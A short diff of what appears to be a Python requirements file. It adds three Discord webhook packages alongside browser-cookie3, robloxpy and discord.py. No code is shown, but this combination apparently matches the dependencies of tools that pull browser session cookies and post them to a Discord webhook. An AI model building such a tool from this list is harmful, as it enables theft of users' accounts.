@@ -2,3 +2,6 @@ requests
 discord.py
 robloxpy
 browser-cookie3
+discord-webhook
+discordwebhook
+discord_webhook
